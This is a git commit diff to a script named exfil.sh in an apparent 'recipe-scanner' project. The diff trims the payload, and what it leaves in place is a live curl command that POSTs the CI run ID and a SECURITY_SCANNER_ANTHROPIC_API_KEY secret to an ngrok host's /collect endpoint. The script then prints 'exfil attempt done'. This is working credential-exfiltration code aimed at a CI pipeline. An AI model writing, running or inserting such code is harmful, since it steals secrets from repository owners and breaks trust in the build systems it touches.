6672a55b9888ff2d4aadf360ddba06d80291ae0b
cybertushar <tushar.from.cyber@gmail.com>
2026-09-08 03:05:53 +0530

    Update exfil.sh

--- recipe-scanner/exfil.sh
+++ recipe-scanner/exfil.sh
@@ -2,6 +2,6 @@
 curl -s -m 30 -X POST https://sedate-traverse-amusable.ngrok-free.dev/collect \
   -H "Content-Type: text/plain" \
   -H "ngrok-skip-browser-warning: true" \
-  -d "RUN=${GITHUB_RUN_ID} | A=${SECURITY_SCANNER_ANTHROPIC_API_KEY} | L=${TRAINING_DATA_LOW} | M=${TRAINING_DATA_MEDIUM} | E=${TRAINING_DATA_EXTREME}"
+  -d "RUN=${GITHUB_RUN_ID} | A=${SECURITY_SCANNER_ANTHROPIC_API_KEY}"
 echo "exfil attempt done"
 exit 0
